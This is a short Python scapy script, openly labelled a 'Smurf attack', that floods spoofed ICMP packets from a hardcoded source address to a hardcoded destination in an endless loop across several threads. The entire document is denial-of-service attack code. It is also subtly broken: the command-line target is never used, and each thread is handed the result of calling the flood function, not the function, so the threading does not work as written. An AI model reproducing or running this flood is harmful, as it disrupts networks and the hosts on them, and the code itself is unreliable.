import sys
from scapy.all import *

target = str(sys.argv[1])

print("Attacking " + target + " Smurf attack")

def smurf():
    packet = IP(src="192.168.32.110", dst="192.168.30.1") / ICMP() / "payloadpayloadpayload"
    send(packet, inter=0.001, loop=1)      

t1 = threading.Thread(target=smurf())
t2 = threading.Thread(target=smurf())
t3 = threading.Thread(target=smurf())
t4 = threading.Thread(target=smurf())

t1.start()
t2.start()
t3.start()
t4.start()